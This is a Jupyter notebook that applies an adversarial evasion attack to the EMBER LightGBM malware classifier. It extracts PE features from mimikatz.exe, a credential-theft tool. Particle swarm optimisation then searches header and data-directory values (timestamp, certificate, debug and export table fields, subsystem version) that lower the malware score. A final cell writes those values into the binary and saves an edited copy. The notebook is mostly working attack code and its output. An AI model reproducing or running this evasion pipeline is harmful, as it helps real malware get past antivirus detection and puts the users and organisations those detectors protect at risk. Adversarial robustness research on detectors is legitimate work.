{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 196,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import ember\n",
    "import lightgbm as lgb\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import lief\n",
    "binary_name = \"mimikatz.exe\" #set this to the binary name, put the ones u want to test in /binaries\n",
    "\n",
    "data_dir = \"../ember2018/\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 197,
   "metadata": {},
   "outputs": [],
   "source": [
    "binary_location = f\"/workspaces/torment-nexus/binaries/{binary_name}\"\n",
    "\n",
    "def get_feature_names() -> list[str]:\n",
    "    byte_histogram = [f\"Byte Histogram {a}\" for a in range(256)] #256\n",
    "\n",
    "    byte_entropy_histogram = [f\"Byte Entropy Histogram {a}\" for a in range(256)] #256\n",
    "\n",
    "    strings_1 = [f\"string.{a}\" for a in [\"numstrings\", \"avlength\", \"printables\"]]\n",
    "    strings_2 = [f\"string.printabledist_{b}\" for b in range(96)]\n",
    "    strings_3 = [f\"string.{a}\" for a in [\"entropy\", \"paths\", \"urls\", \"registry\", \"MZ\"]] # 8 + 96\n",
    "    strings = np.concatenate((strings_1,strings_2,strings_3))\n",
    "\n",
    "    general_info = [f\"general.{a}\" for a in [\"size\", \"vsize\", \"has_debug\", \"exports\", \"imports\", \"has_relocations\", \"has_resources\", \"has_signature\", \"has_tls\", \"symbols\"]]\n",
    "\n",
    "    header_coff = [\"header.coff.timestamp\"]\n",
    "    header_coff_machine = [f\"header.coff.machine_{a}\" for a in range(10)]\n",
    "    header_coff_characteristics = [f\"header.coff.characteristic_{a}\" for a in range(10)]\n",
    "    header_coff_subsystem = [f\"header.optional.subsystem_{a}\" for a in range(10)]\n",
    "    header_coff_dll_characteristics = [f\"header.optional.dll_characteristic_{a}\" for a in range(10)]\n",
    "    header_coff_magic = [f\"header.optional.magic_{a}\" for a in range(10)]\n",
    "    header_optional = [f\"header.optional.{a}\" for a in [\"major_image_version\", \"minor_image_version\", \"major_linker_version\", \"minor_linker_version\", \"major_operating_system_version\", \"minor_operating_system_version\", \"major_subsystem_version\", \"minor_subsystem_version\", \"sizeof_code\", \"sizeof_headers\", \"sizeof_heap_commit\"]] #12\n",
    "    header = np.concatenate((header_coff,header_coff_machine,header_coff_characteristics,header_coff_subsystem,header_coff_dll_characteristics,header_coff_magic,header_optional))\n",
    "\n",
    "    sections_general = [f\"sections.{a}\" for a in [\"section_count\", \"num_empty_sections\", \"num_unnamed_sections\", \"num_read_execute_sections\", \"num_write_sections\",]] #JUST general\n",
    "    sections_section_sizes = [f\"sections.section_{a}_size\" for a in range(50)] # this messes with hashing which i will understand at a later time\n",
    "    sections_section_entropy = [f\"sections.section_{a}_entropy\" for a in range(50)]\n",
    "    sections_section_vsize = [f\"sections.section_{a}_vsize\" for a in range(50)]\n",
    "    sections_entry_name = [f\"sections.entry_name_{a}\" for a in range(50)]\n",
    "    sections_characteristics = [f\"sections.characteristics_{a}\" for a in range(50)]\n",
    "    sections = np.concatenate((sections_general, sections_section_sizes, sections_section_entropy, sections_section_vsize, sections_entry_name, sections_characteristics))\n",
    "\n",
    "    imports_libraries = [f\"imports.libraries.library_{a}\" for a in range(256)]\n",
    "    imports_imports = [f\"imports.import_{a}\" for a in range(1024)]\n",
    "    imports = np.concatenate((imports_libraries,imports_imports))\n",
    "\n",
    "    exports = [f\"exports.export_{a}\" for a in range(128)]\n",
    "\n",
    "    name_order = [a.lower() for a in [\"EXPORT_TABLE\", \"IMPORT_TABLE\", \"RESOURCE_TABLE\", \"EXCEPTION_TABLE\", \"CERTIFICATE_TABLE\",\"BASE_RELOCATION_TABLE\", \"DEBUG\", \"ARCHITECTURE\", \"GLOBAL_PTR\", \"TLS_TABLE\", \"LOAD_CONFIG_TABLE\",\"BOUND_IMPORT\", \"IAT\", \"DELAY_IMPORT_DESCRIPTOR\", \"CLR_RUNTIME_HEADER\"]]\n",
    "    data_directories_unflat = [[f\"directories.{a}_size\", f\"directories.{a}_vaddress\"] for a in name_order]\n",
    "    data_directories = [item for sublist in data_directories_unflat for item in sublist]\n",
    "\n",
    "\n",
    "    feature_names = np.concatenate((byte_histogram, byte_entropy_histogram, strings, general_info, header, sections, imports, exports, data_directories))\n",
    "    return feature_names\n",
    "\n",
    "def classify_binary(binary_location:str) -> float:\n",
    "    lgbm_model = lgb.Booster(model_file=os.path.join(data_dir, \"ember_model_2018.txt\"))\n",
    "    extractor2 = ember.PEFeatureExtractor(2)\n",
    "\n",
    "    file_data = open(binary_location, \"rb\").read()\n",
    "    feature_vector = extractor2.feature_vector(file_data)\n",
    "\n",
    "    return lgbm_model.predict([np.array(feature_vector, dtype=np.float32)])[0]\n",
    "\n",
    "def classify_vectors(feature_vector:np.ndarray | pd.DataFrame) -> float:\n",
    "    if type(feature_vector) is pd.DataFrame:\n",
    "        feature_vector = feature_vector.to_numpy()\n",
    "\n",
    "    lgbm_model = lgb.Booster(model_file=os.path.join(data_dir, \"ember_model_2018.txt\"))\n",
    "    return lgbm_model.predict([np.array(feature_vector, dtype=np.float32)])[0]\n",
    "\n",
    "def get_vectors(binary_location:str) -> np.ndarray:\n",
    "    extractor2 = ember.PEFeatureExtractor(2)\n",
    "    file_data = open(binary_location, \"rb\").read()\n",
    "    return extractor2.feature_vector(file_data)\n",
    "\n",
    "def get_dataframe(feature_vector:np.ndarray) -> pd.DataFrame:\n",
    "    df = pd.DataFrame(feature_vector).T\n",
    "    df.columns = get_feature_names()\n",
    "    return df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 198,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WARNING: EMBER feature version 2 were computed using lief version 0.9.0-\n",
      "WARNING:   lief version 0.14.1-bae887e0 found instead. There may be slight inconsistencies\n",
      "WARNING:   in the feature calculations.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Unable to find the section associated with EXPORT_TABLE\n",
      "Can't read the export table at 0xffffffff\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Byte Histogram 0</th>\n",
       "      <th>Byte Histogram 1</th>\n",
       "      <th>Byte Histogram 2</th>\n",
       "      <th>Byte Histogram 3</th>\n",
       "      <th>Byte Histogram 4</th>\n",
       "      <th>Byte Histogram 5</th>\n",
       "      <th>Byte Histogram 6</th>\n",
       "      <th>Byte Histogram 7</th>\n",
       "      <th>Byte Histogram 8</th>\n",
       "      <th>Byte Histogram 9</th>\n",
       "      <th>...</th>\n",
       "      <th>directories.load_config_table_size</th>\n",
       "      <th>directories.load_config_table_vaddress</th>\n",
       "      <th>directories.bound_import_size</th>\n",
       "      <th>directories.bound_import_vaddress</th>\n",
       "      <th>directories.iat_size</th>\n",
       "      <th>directories.iat_vaddress</th>\n",
       "      <th>directories.delay_import_descriptor_size</th>\n",
       "      <th>directories.delay_import_descriptor_vaddress</th>\n",
       "      <th>directories.clr_runtime_header_size</th>\n",
       "      <th>directories.clr_runtime_header_vaddress</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0.20686</td>\n",
       "      <td>0.008583</td>\n",
       "      <td>0.00417</td>\n",
       "      <td>0.00469</td>\n",
       "      <td>0.007864</td>\n",
       "      <td>0.002909</td>\n",
       "      <td>0.002785</td>\n",
       "      <td>0.00268</td>\n",
       "      <td>0.00986</td>\n",
       "      <td>0.001998</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>2416.0</td>\n",
       "      <td>610304.0</td>\n",
       "      <td>96.0</td>\n",
       "      <td>912092.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>1 rows Ã— 2381 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "   Byte Histogram 0  Byte Histogram 1  Byte Histogram 2  Byte Histogram 3  \\\n",
       "0           0.20686          0.008583           0.00417           0.00469   \n",
       "\n",
       "   Byte Histogram 4  Byte Histogram 5  Byte Histogram 6  Byte Histogram 7  \\\n",
       "0          0.007864          0.002909          0.002785           0.00268   \n",
       "\n",
       "   Byte Histogram 8  Byte Histogram 9  ...  \\\n",
       "0           0.00986          0.001998  ...   \n",
       "\n",
       "   directories.load_config_table_size  directories.load_config_table_vaddress  \\\n",
       "0                                 0.0                                     0.0   \n",
       "\n",
       "   directories.bound_import_size  directories.bound_import_vaddress  \\\n",
       "0                            0.0                                0.0   \n",
       "\n",
       "   directories.iat_size  directories.iat_vaddress  \\\n",
       "0                2416.0                  610304.0   \n",
       "\n",
       "   directories.delay_import_descriptor_size  \\\n",
       "0                                      96.0   \n",
       "\n",
       "   directories.delay_import_descriptor_vaddress  \\\n",
       "0                                      912092.0   \n",
       "\n",
       "   directories.clr_runtime_header_size  \\\n",
       "0                                  0.0   \n",
       "\n",
       "   directories.clr_runtime_header_vaddress  \n",
       "0                                      0.0  \n",
       "\n",
       "[1 rows x 2381 columns]"
      ]
     },
     "execution_count": 198,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "get_dataframe(get_vectors(binary_location))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 199,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WARNING: EMBER feature version 2 were computed using lief version 0.9.0-\n",
      "WARNING:   lief version 0.14.1-bae887e0 found instead. There may be slight inconsistencies\n",
      "WARNING:   in the feature calculations.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Unable to find the section associated with EXPORT_TABLE\n",
      "Can't read the export table at 0xffffffff\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Score so far: 0.0012562375181352395, iteration #1\n",
      "Score so far: 0.0012562375181352395, iteration #2\n",
      "Score so far: 0.0012562375181352395, iteration #3\n",
      "Score so far: 0.0011011673937120121, iteration #4\n",
      "Score so far: 0.0011011673937120121, iteration #5\n",
      "Score so far: 0.0011011673937120121, iteration #6\n",
      "Score so far: 0.0011011673937120121, iteration #7\n",
      "Score so far: 0.0011011673937120121, iteration #8\n",
      "Score so far: 0.0011011673937120121, iteration #9\n",
      "Score so far: 0.0011011673937120121, iteration #10\n",
      "Best position: [2.06860349e-01 8.58298130e-03 4.16987715e-03 ... 9.12092000e+05\n",
      " 0.00000000e+00 0.00000000e+00]\n",
      "Best score: 0.0011011673937120121\n"
     ]
    }
   ],
   "source": [
    "\n",
    "def objective_function(df):\n",
    "    return classify_vectors(df)\n",
    "\n",
    "df = get_dataframe(get_vectors(binary_location))\n",
    "\n",
    "num_particles = 10\n",
    "num_iterations = 5\n",
    "dim = df.shape[1]\n",
    "c1 =1.2\n",
    "c2 = 1.2\n",
    "w = 0.9\n",
    "boundsdict = {\"header.coff.timestamp\": (0, 0xFFFFFFFF),\n",
    "              \"directories.certificate_table_size\": (0,0xFFFFFFFF),\n",
    "              \"directories.debug_vaddress\":(0,0xFFFFFFFF),\n",
    "              \"directories.certificate_table_vaddress\": (0,0xFFFFFFFF),\n",
    "              \"directories.export_table_vaddress\":(0,0xFFFFFFFF),\n",
    "              \"directories.export_table_size\":(0,0xFFFFFFFF),\n",
    "              \"header.optional.major_subsystem_version\":(7,10)\n",
    "              }\n",
    "changeable_str = [\"header.coff.timestamp\",\n",
    "                  \"directories.certificate_table_size\",\n",
    "                  \"directories.debug_vaddress\",\n",
    "                  \"directories.certificate_table_vaddress\",\n",
    "                  \"directories.export_table_vaddress\",\n",
    "                  \"directories.export_table_size\",\n",
    "                  \"header.optional.major_subsystem_version\"]\n",
    "bounds = []\n",
    "changeable = []\n",
    "for index,feature in enumerate(df):\n",
    "    if feature not in changeable_str:\n",
    "        bounds.append((df[feature].iloc[0], df[feature].iloc[0]))\n",
    "    else:\n",
    "        bounds.append(boundsdict[feature])\n",
    "        changeable.append(index)\n",
    "\n",
    "particles = np.random.uniform([b[0] for b in bounds], [b[1] for b in bounds], (num_particles, dim))\n",
    "velocities = np.random.uniform(-1, 1, (num_particles, dim))\n",
    "personal_best_positions = np.copy(particles)\n",
    "personal_best_scores = np.array([objective_function(p) for p in particles])\n",
    "global_best_position = personal_best_positions[np.argmin(personal_best_scores)]\n",
    "\n",
    "\n",
    "for iteration in range(num_iterations):\n",
    "    for i in range(num_particles):\n",
    "        for j in changeable:\n",
    "            velocities[i, j] = (w * velocities[i, j] +\n",
    "                                c1 * np.random.rand() * (personal_best_positions[i, j] - particles[i, j]) +\n",
    "                                c2 * np.random.rand() * (global_best_position[j] - particles[i, j]))\n",
    "            particles[i, j] += velocities[i, j]\n",
    "            particles[i, j] = np.clip(particles[i, j], bounds[j][0], bounds[j][1])\n",
    "        score = objective_function(particles[i])\n",
    "        if score < personal_best_scores[i]:\n",
    "            personal_best_scores[i] = score\n",
    "            personal_best_positions[i] = particles[i]\n",
    "            \n",
    "    global_best_position = personal_best_positions[np.argmin(personal_best_scores)]\n",
    "    print(f\"Score so far: {min(personal_best_scores)}, iteration #{iteration+1}\")\n",
    "\n",
    "print(\"Best position:\", global_best_position)\n",
    "print(\"Best score:\", objective_function(global_best_position))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 207,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Unable to find the section associated with EXPORT_TABLE\n",
      "Can't read the export table at 0xffffffff\n"
     ]
    }
   ],
   "source": [
    "import math\n",
    "\n",
    "\n",
    "bestpositiondf = get_dataframe(global_best_position)\n",
    "binary_location = f\"/workspaces/torment-nexus/binaries/{binary_name}\"\n",
    "binary = lief.PE.parse(binary_location)\n",
    "data_directory = binary.data_directories \n",
    "\n",
    "[\"header.coff.timestamp\",\n",
    "\"directories.certificate_table_size\",\n",
    "\"directories.debug_vaddress\",\n",
    "\"directories.export_table_vaddress\",\n",
    "\"directories.export_table_size\",\n",
    "\"header.optional.major_subsystem_version\"]\n",
    "timestamp = bestpositiondf[\"header.coff.timestamp\"]\n",
    "certificate_table_vaddress = bestpositiondf[\"directories.certificate_table_vaddress\"]\n",
    "certificate_table_size = bestpositiondf[\"directories.certificate_table_size\"]\n",
    "debug_vaddress = bestpositiondf[\"directories.debug_vaddress\"]\n",
    "export_table_vaddress = bestpositiondf[\"directories.export_table_vaddress\"]\n",
    "export_table_size = bestpositiondf[\"directories.export_table_size\"]\n",
    "major_subsystem_version = math.ceil(bestpositiondf[\"header.optional.major_subsystem_version\"])\n",
    "binary.header.time_date_stamps = timestamp\n",
    "data_directory[4].rva = certificate_table_vaddress\n",
    "data_directory[4].size = certificate_table_size\n",
    "data_directory[6].rva = debug_vaddress\n",
    "data_directory[0].rva = export_table_vaddress\n",
    "data_directory[0].size = export_table_size\n",
    "binary.optional_header.major_subsystem_version = major_subsystem_version\n",
    "\n",
    "binary.write(\"/workspaces/torment-nexus/binaries/mimikatz-edited.exe\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
